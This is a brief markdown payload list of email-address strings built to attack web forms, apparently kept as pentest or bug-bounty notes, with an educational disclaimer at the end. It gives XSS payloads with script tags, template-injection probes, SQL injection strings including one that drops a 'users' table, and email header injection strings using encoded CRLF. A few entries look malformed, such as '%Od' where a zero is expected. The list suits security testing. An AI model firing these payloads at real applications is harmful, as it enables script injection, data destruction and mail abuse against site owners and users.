## Email address inputs as per vulns

### XSS Payloads:

1. `test+(<script> alert(0)</script>)@example.com`
2. `test@example(<script>alert(0)</script>).com`
3. `"<<script>alert(0)</script>"@example.com`

### Template Injection Payloads:

1. `"<%=7*7 %>*@example.com"`
2. `test+(${{7*7}})@example.com`

### SQL Injection Payloads:

1. `''''OR 1=1--''''@example.com`
2. `"mail');DROP TABLE users;--"@example.com`

### Email Header Injection Payloads:

1. `"%Od%0aContent-Length:%200%0d%0a%Od%0a"@example.com`
2. `"recipient@test.com>\r\nRCPT TO:<victim+*]"@test.com`





### Disclaimer 🚨

⚠️ **Disclaimer:** The above content is not owned by me. It has been sourced from the internet for educational purposes only. I do not claim ownership or responsibility for the content provided. Please use it responsibly and in accordance with applicable laws and ethical guidelines.
